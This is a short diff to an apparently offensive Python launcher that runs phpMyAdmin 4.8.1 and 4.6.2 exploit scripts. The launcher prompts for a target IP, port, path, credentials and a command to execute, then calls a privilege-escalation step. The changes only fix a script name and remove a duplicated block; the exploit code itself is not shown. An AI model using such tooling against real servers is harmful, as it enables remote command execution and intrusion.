@@ -225,7 +225,7 @@ def run_phpmyadmin_481_exploit():
     command=input("Enter command to execute (e.g., whoami): ")
 
     # Running the exploit with provided inputs
-    os.system(f"python phpmyadmin-481-exploit.py {ipaddr} {port} {path} {username} {password} {command}")
+    os.system(f"python phpmyadmin-4.8.1-exploit.py {ipaddr} {port} {path} {username} {password} {command}")
     privilege_escalation()
 
 
@@ -239,11 +239,6 @@ def run_phpmyadmin_462_exploit():
     username=input("Enter username: ")
     password=input("Enter password: ")
     command=input("Enter command to execute (e.g., whoami): ")
-
-    # Running the exploit with provided inputs
-    os.system(f"python phpMyAdmin_4.6.2_exploit.py {ipaddr} {port} {path} {username} {password} {command}")
-    privilege_escalation()
-
 
     # Running the exploit with provided inputs
     os.system(f"python phpMyAdmin_4.6.2_exploit.py {ipaddr} {port} {path} {username} {password} {command}")
